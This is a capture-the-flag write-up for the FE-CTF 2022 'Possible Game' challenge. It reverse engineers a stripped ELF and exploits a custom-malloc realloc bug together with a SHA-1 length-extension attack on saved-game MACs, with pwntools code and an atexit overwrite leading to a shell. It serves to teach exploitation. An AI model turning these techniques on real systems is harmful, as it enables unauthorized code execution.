# FE-CTF 2022: Cyber Demon

# Challenge: Possible Game


For this challenge we've been given a binary (`game`) and an address
(`possible.ctf:1337`).  The file is a statically linked and stripped ELF, just
like in the good old days (except this one is 64 bit).

*Organizer's note:*

> This challenge was designed to be the "rockstar killer", which is half of the
> reason it was statically linked and stripped, because that has the potential
> to eat a lot of time.  The other half of the reason is that the binary uses a
> custom `malloc()`, and we wouldn't like that fact to be immediately obvious.
>
> The binary was compiled with `dietlibc` to make the reverse engineering task
> less daunting (~50K vs ~950K with `gcc` and `glibc`).  You be the judge of
> wether that actually helped.

## Local setup

Running the binary we see:

```
$ ./game
open: No such file or directory
```

Running it with `strace` we can see that the binary needs a file called
`secret_key`:

```
$ strace ./game
execve("./game", ["./game"], 0x7ffde7363300 /* 37 vars */) = 0
arch_prctl(ARCH_SET_FS, 0x7ffdf137a280) = 0
brk(NULL)                               = 0xede000
brk(0xedf000)                           = 0xedf000
open("/dev/urandom", O_RDONLY)          = 3
open("secret_key", O_RDONLY)            = -1 ENOENT (No such file or directory)
write(2, "open", 4open)                     = 4
write(2, ": ", 2: )                       = 2
write(2, "No such file or directory", 25No such file or directory) = 25
write(2, "\n", 1
)                       = 1
exit(1)                                 = ?
+++ exited with 1 +++
```

Create the file:

```
$ echo much secret > secret_key
```

And now the game runs:

<img src=game-easy.png width=132px />

This looks like a kind of [edge-matching
puzzle](https://en.wikipedia.org/wiki/Edge-matching_puzzle).  It's not clear
what we would get for solving the game, so let's reverse it instead.

## Reverse engineering

*Organizer's note:*

> If you had no trouble reverse engineering the binary (or had trouble, but did
> it anyway) you can skip to "Functional overview" now.

Loading the binary up in our favorite disassembler we see that the first point
on the agenda will be finding `main`.  The `_start` function (well, entrypoint
of the ELF, since it doesn't have symbols, but you get the point) looks
different to what you might be used to (`gcc` or `clang`):

```.asm
pop     rdi
mov     rsi, rsp
push    rdi
lea     rdx, [rsi+rdi*8+8]
mov     cs:qword_40D340, rdx
call    sub_4060AA
mov     rdi, rax
call    sub_408AA1
hlt
```

At this point some will recognize
[`dietlibc`](https://github.com/ensc/dietlibc/blob/7d1eb8beb7cdaaa1c5bc010896c9f70cdb7b2519/x86_64/start.S).

First, we immediately see that `envp` (which follows `argv` when the kernel
passes control) is stored at `0x40d340`.  The first Hard Problem of Computer
Science is "naming things", and this is a freebie, so we might as well rename
that location right away.

Usually `libc` does some final steps (e.g. calls functions registered with
`atexit` as required by POSIX) before exiting, so `main` is probably going to be
either at `0x4060aa` or called from there.

The second function, at `0x408aa1`, will probably call `exit` as some point
(otherwise we would hit `hlt`, which would result in a `SIGSEGV` being
delivered), so let's have a look at that, so we can start to populate our symbol
table.

<img src=fini.png />

(*Organizer's note:* I'm lazy, so today IDA is my favorite disassembler.)

Here we see that `0x40e3a0` looks to be the number of functions registerred with
`atexit`, and `0x40e8b8` is one word below the list of those functions (since
`rbx` never becomes `0` when calling into that list).  So let's rename those
locations to something like `atexit_num_funcs` and `atexit_list_minus_8`.  Also
give `0x40e8c0` the name `atexit_list` (this will become important later).

Finally the function at `0x405d70` is called:

<img src=exit.png width=50% />

Syscall `0x3c` = 60 is `SYS_EXIT` on AMD64, so we name the function `_exit`, and
the prior `exit`.

OK, back to `0x4060aa`.  It's too big to list here, but it does not look like
your typical `main` function.  Rather, it looks like some sort of initializer as
it references the strings `"/dev/urandom"`, `"LD_PRELOAD"` and `"valgrind"`.  If
it calls `main` (and it must), then that will probably happen last.  The last
call in this function is to `0x405cb7`, which is given three arguments, that
fits with the prototype for main: `int main(int argc, char *argv[], char
*envp[])`.

Looking at `main`:

```.c
int __cdecl main(int argc, const char **argv, const char **envp) {
  sub_4068DD(off_40D0C0, 0LL, 0LL, 1024LL);
  sub_4068DD(off_40D140, 0LL, 0LL, 1024LL);
  sub_4068DD(off_40D040, 0LL, 0LL, 1024LL);
  dword_40D220 = sub_405D9B("/dev/urandom", 0LL);
  if ( dword_40D220 == -1 )
  {
    sub_405EBC("open", 0LL);
    result = 1;
  }
  else
  {
    sub_404D8C("/dev/urandom", 0LL);
    sub_405BD2("/dev/urandom");
    result = 0;
  }
  return result;
}
```

Looking at cross references to `0x40d0c0`, `0x40d140` and `0x40d040` it is not
too difficult to guess that those are `FILE *stdin, *stdout, *stderr`,
respectively.  And then the first three lines look an awful lot like

```.c
setvbuf(stdin, NULL, 0, _IONBF, BUFSIZ);
setvbuf(stdout, NULL, 0, _IONBF, BUFSIZ);
setvbuf(stderr, NULL, 0, _IONBF, BUFSIZ);
```

Which, according to C89, is equivalent to 

```.c
setbuf(stdin, NULL);
setbuf(stdout, NULL);
setbuf(stderr, NULL);
```

Looking at the function call in the body of the first `if`, we see something like
this (after choosing sensible types and variable names):

```.c
void __cdecl perror(const char *s)
{
  const char *s_beg;
  char *errstr;
  __int64 errno;
  signed __int64 s_len_ish;
  bool c;
  char *errstr_beg;
  signed __int64 errstr_len_ish;

  s_beg = s;
  errstr = "[unknown error]";
  errno = *MK_FP(__FS__, -4LL);
  if ( (unsigned int)errno <= 0x81 )
    errstr = strerror_list[errno];
  if ( s )
  {
    s_len_ish = -1LL;
    do
    {
      if ( !s_len_ish )
        break;
      c = *s++ == 0;
      --s_len_ish;
    }
    while ( !c );
    write(STDERR_FILENO, s_beg, ~s_len_ish - 1);
    write(STDERR_FILENO, ": ", 2uLL);
  }
  errstr_beg = errstr;
  errstr_len_ish = -1LL;
  do
  {
    if ( !errstr_len_ish )
      break;
    c = *errstr_beg++ == 0;
    --errstr_len_ish;
  }
  while ( !c );
  write(STDERR_FILENO, errstr, ~errstr_len_ish - 1);
  write(STDERR_FILENO, "\n", 1uLL);
}
```

Notice that we renamed address `0x405da9` to `write`.  It looks like the following:

```.asm
<_exit>:
0x405d70: mov     al, 0x3c
0x405d72: mov     ah, 0     <-----.
[...]                             |
<write>:                          |
0x405da9: mov     al, 1           |
0x405dab: jmp     loc_405D72  ----'
```

So it's a jump into the middle of `_exit`, which just skips setting `al`.  This
is just clever `dietlibc` magic; don't be scared.  Setting `al` to `1`
(`SYS_WRITE`) is what makes this function `write`.  We can even rename address
`0x405d72` to `syscall_0_255`, since this technique is probably going to be used
other places as well.

Now that we know that `perror("open")` is called if the previous function call
returned `-1`, it seems safe to guess that that function is really `open`, which
is also easily confirmed from the disassembly (`SYS_OPEN` = 2):

```.asm
<probably_open>:
0x405d9b: mov     al, 2
0x405d9b: jmp     0x405d72 <syscall_0_255>
```

Continuing with the `else` branch we have two function calls, neither of which
seem to take any arguments.  The first function is at `0x404d8c`:

```.c
void __cdecl sub_404D8C(){
  int fd;
  int ret;

  fd = open("secret_key", 0);
  if ( fd == -1 )
  {
    perror("open");
    exit(1LL);
  }
  ret = sub_405DA2((unsigned int)fd, byte_40D240, 256LL);
  if ( ret == -1 )
  {
    perror("read");
    exit(1LL);
  }
  while ( byte_40D240[ret - 1] == 10 )
    --ret;
  byte_40D240[ret] = 0;
}
```

Once again we get a strong hint from the `perror` call, so we rename the function at
`0x405da2` to `read`.  The function reads up to 256 characters from the file
`secret_key` into a global buffer and NUL-terminates it at the first `\n`.  We
rename the global buffer to `secret_key`, and the function to `read_secret_key`.

The second function may give your disassembler some trouble since it uses a jump
table.  After convincing IDA that the function really ends at the `ret` function
we see something like this:

<img src=disasm_main_menu.png />

The function inside the loop takes `5` as its first argument followed by 5
strings, which suggests that it is a varargs function.  The returned value is
incremented by one and checked to be less than or equal to 6, which suggests
that the function can return values in the range -1 to 5, inclusive, and that
the compiler just increments this to allow it to use a jump table.

Digging into the function, which we'll call `show_menu`, it is not too hard to
confirm these assumptions, and also see that the function returns `-1` (`EOF`)
if `stdin` is closed.  Otherwise, the number (1-indexed) of the option chosen
by the user.

We also get (guess) a few more symbols for our table:

```
0x406796: printf
0x4064f3: fgets
0x405db0: atoi
0x40686b: puts
```

Going back, we name the calling function `main_menu`.  The jump via the jump table works like this:

```.asm
[...]
0x405c03: call    show_menu
0x405c08: add     eax, 1
0x405c0b: cmp     eax, 6
0x405c0e: ja      short loc_405bd6 ; loop back and show menu again
0x405c10: mov     eax, eax
0x405c12: lea     rdx, ds:0[rax*4]
0x405c1a: lea     rax, main_menu_jump_table
0x405c21: mov     eax, [rdx+rax]
0x405c24: cdqe
0x405c26: lea     rdx, main_menu_jump_table
0x405c2d: add     rax, rdx
0x405c30: jmp     rax
```

So the entries in the jump table are addresses relative to the jump table
itself, which sits at address `0x409450`.

The first option is `"New game"`, which corresponds to the second entry in the
jump table: `0xffffc7e2` = -14366.  Relative to the jump table that is address:
`0x409450` - 14366 = `0x405c32`, i.e. right after the `jmp rax` itself.

The other jump targets can be computed similarly and we get:

```.asm
<main_menu_new_game>:
0x405c32: mov     eax, 0
0x405c37: call    sub_405a95
0x405c3c: jmp     short loc_405caf   ------.
<main_menu_load_game>:                     |
0x405c3e: mov     eax, 0                   |
0x405c43: call    sub_404e2c               |
0x405c48: test    al, al                   |
0x405c4a: jz      short loc_405cae -----.  |
0x405c4c: mov     eax, 0                |  |
0x405c51: call    sub_405880            |  |
0x405c56: jmp     short loc_405cae ----.|  |
<main_menu_cont_game>:                  |  |
0x405c58: mov     rax, cs:qword_40d228  |  |
0x405c5f: test    rax, rax              |  |
0x405c62: jz      short loc_405c70 --.  |  |
0x405c64: mov     eax, 0             |  |  |
0x405c69: call    sub_405880         |  |  |
0x405c6e: jmp     short loc_405caf --+--+-.|
0x405c70: lea     rdi, aNoGame  <----'  |  | "No game"
0x405c77: call    puts                  |  |
0x405c7c: jmp     short loc_405caf -----+-.|
<main_menu_hof>:                        |  |
0x405c7e: lea     rdi, aHallOfFame_0    |  | "[~~~~  HALL OF FAME ~~~~]"
0x405c85: call    puts                  |  |
0x405c8a: lea     rdi, aCatHall_of_fam  |  | "cat hall_of_fame.txt"
0x405c91: call    sub_406a0a            |  |
0x405c96: lea     rdi, asc_409436       |  | "[~~~~~~~~~~~~~~~~~~~~~~~]" |
0x405c9d: call    puts                  |  |
0x405ca2: jmp     short loc_405caf -----+-.|
<main_menu_quit>:                       |  |
0x405ca4: mov     edi, 0                |  |
0x405ca9: call    exit                  |  |
0x405cae: nop        <------------------'  |
0x405caf: jmp     loc_405bd6   <-----------'---> loop back and show menu again
[...]
0x405cb5: pop     rbp
0x405cb6: retn
```

Which immediately tells us that `0x405a95` is `new_game`, `0x404e2c` is
`load_game`, `0x405880` is `continue_game` and that a pointer to the current
active game is stored at `0x40d228` (we'll call it `g_game`).  We can also guess
that the function at `0x406a0a` is `system`, which is always interesting.

In `new_game` we first see that if `g_game` is not `NULL`, a function is called, 
taking it as an argument.  This is probably a function call to free or reset
the current game, so we'll just call it `free_game?` for now.

Then we see a call to the `show_menu` function we covered before with the
options `"Easy"`, `"Medium"` and `"Hard"`.  Oddly the values (which will turn
out to be side lengths of the puzzle) are stored in global variables in RW
memory at `0x40d010`, `0x40d018` and `0x40d020` respectively.

Maybe the goal is to overwrite one of these values in order to make the game easier?

*Organizer's note:*

> It is not.  This challenge has a number of red herrings.

After a difficulty is chosen, the function at `0x403c32` is called with the
difficulty's number (which in an act of foresight, we'll call `size`) as its
only argument.  The result is stored into `g_game`, so we'll call this function
`create_game`.

Looking into `create_game` we see that the function at `0x403afd` is called with
`2 * size * size` as its only argument, and that the return value seems to be a
buffer judging from the following code.  This suggests that the function is
`malloc`.  At the end of `create_game` another function at `0x40119e` is called
with the two buffers as arguments, which are not returned from the function call.  
A strong hint that this function is really `free`.  The `malloc`/`free` hypothesis
can of course also be tested dynamically by attaching a debugger and actually calling them.

It checks out.

*Organizer's note:*

> This `malloc` is actually a thin wrapper around the real `malloc` which in
> debug mode asserts that the returned pointer is not `NULL`, but here does
> nothing.

We'll not go into reversing the game representation here; skip to "Functional
overview" for that.

Turning our attention to `continue_game` we see an infinite loop which shows the
current game state then a menu with options `"Move"`, `"Rotate"`, `"Mirror"`,
`"Save game"`, `"See score"` and `"Exit to main menu"` (and another jump table),
until the game is won (or exited):

<img src=disasm_game_loop.png />

We also see that winning the game on difficulty `HARD` calls the function here
named `enter_hall_of_fame`:

<img src=disasm_hall_of_fame.png />

What we see here, ladies and gentlemen, is an oldskool stack buffer overflow.
Win the game on hard mode => instant pwnage (pronounced with a french accent).

*Organizer's note:*

> Red herring.  If you can solve a `HARD` instance of the game, we'd love to
> hear about it; we didn't even bother to try ourselves.
>
> For reference here's a `HARD` instance of the game:
>
> <img src=hard-game.png width=50% />

This writeup is already getting quite long, so we'll end the reversing part in a
moment and trust that you can take it from here.  But we'd like to point out one
more thing before we continue; when loading a saved game (which is the game
state serialized, MAC'ed and base64 encoded) the prompt `"Enter saved game (end
with a blank line):"` is printed and then a function at `0x404cb7` which we'll
call `readlines` is called:

```.c
void *readlines() {
  size_t v0;
  int c;
  int sawnl;
  char *buf;
  size_t numb;
  size_t i;

  i = 0LL;
  numb = 0LL;
  buf = NULL;
  sawnl = 1;
  while ( 1 )
  {
    while ( 1 )
    {
      c = fgetc(stdin);
      if ( c != '\n' )
        break;
      if ( sawnl )
        goto LABEL_10;
      sawnl = 1;
    }
    if ( c == EOF )
      break;
    sawnl = 0;
    if ( i == numb )
    {
      numb += 256LL;
      buf = (char *)realloc(buf, numb);
    }
    v0 = i++;
    buf[v0] = c;
  }
LABEL_10:
  buf[i] = 0;
  return realloc(buf, i + 1);
}
```

Here we have a one-byte heap buffer overflow; if a non-zero multiple of 256
bytes is read, then the assignment after `LABEL_10` will store a zero into the
byte just *after* the buffer.  The `readlines` function is only ever called from
`load_game`.

*Organizer's note:*

> We *think* this is a red herring.  The bug was found in play test, but an
> exploit against it looks to be at least as challenging as the intended
> solution if it's even possible, so the bug was left in, but never fully
> explored.

## Functional overview

As you've seen, the game presents a number of menus.  They fit together roughly
like this:

Main menu (`main_menu @ 0x405bd2`)

- New game (`new_game @ 0x405a95`)
  - Easy (`create_game(3) @ 0x403c32`)
  - Medium (`create_game(7)`)
  - Hard (`create_game(13)`)
    - Shuffle game (`shuffle_game(size * size * 10) @ 0x4042ba`)
    - Negate number of moves, rotations and mirrorings used; these are
      decremented as the game progresses, thus "unshuffling" the game would
      result in a zero in each field.
    - Game menu (`continue_game @ 0x405880`)
- Load game (`load_game @ 0x404e2c`)
  - Continue game (`continue_game`)
- Continue game (`continue_game` if `g_game != NULL`)
- Hall of Fame
  - `system("cat hall_of_fame.txt") @ 0x406a0a`
- Quit (`exit(0) @ 0x408aa1`)

Game loop (`continue_game @ 0x405880`)

- Show game (`show_game @ 0x40447c`)
- Is game won? (`is_game_won @ 0x40491c`)
  - Enter Hall of Fame (`enter_hall_of_fame @ 0x4056f3` if `g_game->size` is
    `HARD`)
- Show menu
  - Move
    - Move from: (`read_position(&x, &y) @ 0x4057df`)
    - Move to: (`read_position(&x2, &y2)`)
    - `act_move(g_game, x, y, x2, y2) @ 0x403fd3`
  - Rotate
    - Rotate: (`read_position(&x, &y)`)
    - `act_rotate(g_game, x, y) @ 0x40409c`
  - Mirror
    - Mirror: (`read_position(&x, &y)`)
    - `act_mirror(g_game, x, y) @ 0x4041f5`
  - Save game (`save_game @ 0x4052da`)
  - Exit to main menu
  
### Game creation and internal representation

Internally a game state is stored in a number of `malloc()`'ed buffers and
represented like this:

<img src=game-representation.png />

The fields `moves`, `rotations` and `mirrorings` are the number of each action
"left"; when a new game is created, we start with a random but won game and
perform `size * size * 10` random actions on it.  Initially these fields hold
the number of each action performed during shuffling.  They are decremented on
each user action.  The score (which is completely irrelevant) is computed as

$$
  \textrm{score} = 10 \cdot \textrm{size}^2 + \textrm{moves} + \frac{3 \cdot \textrm{rotations}}{2} + \frac{\textrm{mirrorings}}{2}
$$

A won game is generated by first allocating buffers for the vertical/horizontal
pairs of numbers/colors (which are chosen randomly), then copying those into the
game state.  Afterwards these buffers are freed, which will become important
later:

<img src=create_game.png />

### Saving and loading games

A saved game is just a serialization of the internal state where both the color
and number of a side of a game piece is packed into one byte, then MAC'ed and
finally base64 encoded.  Loading a game just reverses this process, and checks
that the MAC is valid.

<img src=save_game.png />

As some of you undoubtedly know this is not a good way to MAC.  More on this in
the "Exploit" section.

### `krmalloc`

As mentioned, this binary uses a custom `malloc`.  And it has a bug.  The
`malloc` used here is the same one as in "The C Programming Language", 2nd
edition by Kernighan and Ritchie (ISBN 0-13-110362-8), pp. 185.

The way it works is that every chunk has a size header, and free chunks has a
pointer to the next free chunk.  But K&R didn't include `realloc` so we added
that in.  (Un)fortunately we introduced a bug in the process.

When `realloc()`'ing a buffer which is followed by a free chunk we need to move
that chunk's header.  But the header of a free chunk is two words large, so the
order of operations matter (think `memcpy` vs `memmove`).  The following figures
should make the problem clear.  Green is unallocated memory and blue is
allocated memory.

<img src=kandr-1.png />
<img src=kandr-2.png />
<img src=kandr-3.png />
<img src=kandr-4.png />
<img src=kandr-5.png />
<img src=kandr-6.png />
<img src=kandr-7.png />
<img src=kandr-8.png />
<img src=kandr-9.png />
<img src=kandr-10.png />

Overwriting the size field with the next pointer (plus 8) will result in a
practically infinite free chunk, which means that new allocations can collide
with previous allocations.

Then the natural question to ask is "where is `realloc` called".  In this binary
there are only two calls to `realloc` and they are both in `readlines`.

## Exploit

The `readlines` function increases its input buffer in increments of 256 bytes
as it goes along, then as a final step resizes the buffer to exactly fit the
read data.  This means that an input of 240--247 bytes (remember the
NUL-terminator) will trigger the `realloc` bug.

So our plan for heap corrution is:

1. Allocate `A`, at least $256 + 16 + 1$ bytes.
1. Allocate `B` which we want to overwrite later.
1. Free `A`.
1. `readlines()` between $256 - 8 - 7 - 1$ and $256 - 8 - 1$ bytes to trigger
    the `realloc` bug.
1. `readlines()` overflow into `B`.

Or in pictures:

<img src=trigger-bug-1.png />
<img src=trigger-bug-2.png />
<img src=trigger-bug-3.png />
<img src=trigger-bug-4.png />
<img src=trigger-bug-5.png />

But we have a problem:

```
$ ./game
  1. New game
  2. Load game
  3. Continue game
  4. Hall of Fame
  5. Quit
> 2
Enter saved game (end with a blank line):
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

MAC error
```

### Side quest: Hash extention attack

As mentioned earlier the way this binary computes the MAC for saved games is
problematic.  The reason is that if `SHA-1(data)` and `len(data)` is known one
can construct `ext` such that `SHA-1(data || ext)` can be computed even though
`data` is unknown.

This figure shows, in broad strokes, how SHA-1 (and other hashing algorithms)
works:

<img src=sha1.png />

The `F` in the figure is a "compression function".  Exactly how it works is not
relevant for this attack.  The brownish block at the end is a padding block
which brings the input data up to a whole multiple of blocks.  The final field
is the length of the input data, in bits, encoded as a 64-bit big endian
integer.  The green/red arrows show data known/unknown to us, respectively.

Now if we replicate the padding in our `ext`, everything from here on out is
known to us:

<img src=sha1-ext.png />

In our setting we have `MAC = SHA-1(secret || game)` so `data` = `secret ||
game`, which means that `len(data)` is *not* known.  However, we know from
reversing that `len(secret)` is at most 255 bytes, so the actual length can be
found by trial and error.

### We have a plan!

Now that we've build an arsenal of primitives we can put down a plan of attack.
It goes like this:

1. Obtain a game with a valid MAC.
1. Find length of secret key by trial and error.
1. Prepare the heap for exploitation.
1. Trigger the `realloc` bug.
1. Use a hash extension attack to overflow a heap buffer.
1. ...
1. PROFIT!

#### Step 1

This step is very easy; we just start a new game and save it.  Done.

#### Step 2

If we append any data to a saved game it will load just fine as long as the MAC
checks out.  So we just try appending fake padding until we find the length of
`secret_key`.  There are a number of extension attack implementations available
online, e.g. [`hashpumpy`](https://pypi.org/project/hashpumpy/).

In the following, `hashpump` is a function that takes `old_hash` (hex encoded),
`old_data`, `extra` and `len_key` such that `len(key)` = `len_key` and
`SHA-1(key || old_data)` = `old_hash`, and returns `new_hash` (also hex encoded)
and `new_data` such that `SHA-1(key || new_data)` = `new_hash` and `new_data`
starts with `old_data` and ends with `extra`:

```.py
from hashpumpy import hashpump
from pwn import *

def mksock():
    return remote('possible.ctf', 1337)

# Obtain saved game
sock = mksock()
sock.sendline(b'1') # new game
sock.sendline(b'1') # easy
sock.sendline(b'4') # save game
sock.recvuntil(b'safe place:\n')
# Base 64 is split over two lines
save = sock.recvline().strip()
save += sock.recvline().strip()
sock.close()

# Extend saved game
def extend(extra):
    old_save = b64d(save)
    old_hash, old_data = old_save[:20], old_save[20:]
    new_hash_hex, new_data = hashpump(old_hash.hex(), old_data, extra, len_key)
    new_hash = bytes.fromhex(new_hash_hex)
    new_save = new_hash + new_data
    return b64e(new_save).encode()

# Load a saved game
def load(extra):
    sock.sendline(b'2') # load game
    sock.recvuntil(b'Enter saved game')
    sock.recvline()
    sock.sendline(extend(extra))
    sock.sendline(b'') # send blank line to end
    sock.sendline(b'n') # don't end current game

# Find secret key length
len_key = 0
with log.progress('Finding key length') as p:
    while True:
        with context.silent:
            sock = mksock()
            load(b'\0') # hashpumpy will not accept extra=b''
            line = sock.recvline()
            sock.close()
        if b'MAC error' not in line:
            break
        len_key += 1
        p.status(str(len_key))
    p.success(str(len_key))
```

For determining the key length the `extra` parameter is not relevant, but
`hashpumpy` will not work without it, so we just add a NUL-byte.  Besides, we
need to add other data later on.

Running:

```
$ python3 doit.py
[...]
[+] Finding key length: 64
```

#### Step 3

A we saw earlier we need an allocation `A` of at least $256 + 16 + 1$ bytes
followed by an allocation `B` which we want to overwrite later.  Then `A` needs
to be freed, to have enough space to trigger the `realloc` bug through
`readlines`.

We already saw how `create_game` first allocates two buffers for the
vertical/horizontal pairs of colors/numbers, then frees them later after they
have been copied into the game data.  Choosing a `HARD` instance of the game
maximizes the free space before the game data:

<img src=create_game_hard.png />

#### Step 4

We can use the hash extension attack to append data to a saved game such that we
trigger the `realloc` bug in `readlines` *and* pass the MAC check.  However it's
important that this step doesn't ruin the heap layout obtained in step 3.
Luckily the game will ask if we really want to load a new game if a game is
already ongoing.  Of course we don't.

To trigger the bug we need to send between 240 and 247 bytes (again, remember
the NUL-terminator).  As it turns out 178 bytes base 64 encodes into exactly 240
bytes.

In pictures:

<img src=readlines-trigger-bug.png />
<img src=excellent.jpg width=20% />

#### Step 5

We're ready to overflow some game data!

This will be our strategy:

<img src=overflow.png />

Now we just need to figure out some offsets, easy stuff\^W\^Wdeep breaths.

SHA-1 blocks are 64 bytes and the fake padding is at least 9 bytes, so

$$
|\texttt{prefix}| = 20 + \lceil |\texttt{secret}| + 43 + 9 \rceil^{(64)} - |\texttt{secret}|
$$

Allocations come in 8 byte increments, so the size of the buffer allocated in
`readlines` is

$$
|\texttt{buffer}| = \lceil |\texttt{base64}| + 1 \rceil^{(8)}
$$

Base 64 packs 6 bits per byte with an overhead of up to 2 bytes, so

$$
\begin{align*}
    6 \frac{|\texttt{base64}|}{8} - 2 &\leq |\texttt{prefix}| + |\texttt{ext}|\\
    |\texttt{base64}| &\leq \tfrac{4}{3}(|\texttt{prefix}| + |\texttt{ext}| + 2)
\end{align*}
$$

The whole thing (including the second size field) adds up to

$$
\begin{align*}
         & \lceil |\texttt{base64}| + 1 \rceil^{(8)} + 8 + |\texttt{prefix}| + |\texttt{ext}| \\
    \leq & \lceil \tfrac{4}{3} (|\texttt{prefix}| + |\texttt{ext}| + 2) + 1 \rceil^{(8)} + 8 + |\texttt{prefix}| + |\texttt{ext}| \\
    \leq & \tfrac{4}{3} (|\texttt{prefix}| + |\texttt{ext}| + 2) + 1 + 7 + 8 + |\texttt{prefix}| + |\texttt{ext}| \\
    =    & \tfrac{7}{3} (|\texttt{prefix}| + |\texttt{ext}|) + \tfrac{56}{3}
\end{align*}
$$

Everything up to the extension should add up to the largest value less than 704, so

$$
\begin{align*}
    \tfrac{7}{3} (|\texttt{prefix}| + |\texttt{ext}|) + \tfrac{56}{3} - |\texttt{ext}| &\leq 704\\
    \tfrac{7}{3} |\texttt{prefix}| + \tfrac{4}{3} |\texttt{ext}| + \tfrac{56}{3} &\leq 704\\
    \tfrac{4}{3} |\texttt{ext}| &\leq 704 - \tfrac{7}{3} |\texttt{prefix}| - \tfrac{56}{3}\\
    \tfrac{4}{3} |\texttt{ext}| &\leq \tfrac{2056}{3} - \tfrac{7}{3} |\texttt{prefix}|\\
    |\texttt{ext}| &\leq 514 - 1.75 |\texttt{prefix}|
\end{align*}
$$

This size will make the extension start right before or at the game data.  Just
pad with garbage (zeros will be fine) to get the right size.

The game data's offset into the extension is given by

$$
  704 - (\lceil |\texttt{base64}| \rceil^{(8)} + 8 + |\texttt{prefix}|)
$$

Or in Python (extending on the previous script):

```.py
# Calculate lengths and game data offset in extension
len_prefix = 20 + align(64, len(b64d(save)) - 20 + len_key + 9) - len_key
len_ext = int(514 - 1.75 * len_prefix)
len_b64 = (len_prefix + len_ext + 2) * 4 // 3
len_all = align(8, len_b64 + 1) + 8 + len_prefix
off_ext = 704 - len_all

info(f'|key|       = {len_key}')
info(f'|prefix|    = {len_prefix}')
info(f'|ext|       = {len_ext}')
info(f'|base64|    = {len_b64}')
info(f'|all|-|ext| = {len_all}')
info(f'game offset = {off_ext}')
```

#### Step 6

This is were our plan starts being a bit vague ("...").  If we can, somehow,
obtain a heap pointer we will be able to construct an arbitrary "game".

One way to leak a pointer is through the game tiles, but recall the internal
game representation: we would need to overflow the `rows` pointer with a pointer
to a "row" that has a pointer to a "game tile" which is really a heap pointer.

Here the internal representation again for reference:

<img src=game-representation.png />

Maybe surprisingly, we actually have such a pointer.

Recall that the heap allocator has a global pointer (`freelist`) which points at
the first free chunk in the heap.  The first word of a chunk is a size field,
but in triggering the `realloc` bug we overwrote this field with a pointer to
the next free chunk.  The size field has been changed since, but only by a fixed
amount.

<img src=pointer-pointer-pointer.png />

After overwriting `rows` we can then show the game and parse this "somewhere"
pointer out of the displayed game.

#### Step 7 (PROFIT!)

Once we can construct arbitrary games it is easy to obtain a write-what-where
gadget.  Each tile in a game is represented as 8 bytes, so swapping two tiles
would allow us to write a machine word at an arbitrary address:

<img src=www.png />

But what should we overwrite?  Remember that `atexit_list` we found way back in
the reversing step?  That's a juicy target.  And we also found `system`, so we
have a one-gadget in there somewhere.

See `doit.py` for the details.

Running:

```
$ python3 doit.py
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] Finding key length: Done
[*] Found len(key) = 64
[*] |key|       = 64
[*] |prefix|    = 84
[*] |ext|       = 367
[*] |base64|    = 604
[*] |all|-|ext| = 700
[*] game offset = 4
[+] Opening connection to localhost on port 1337: Done
[*] Switching to interactive mode
$ cat flag
flag{no realloc, no problem!}
```
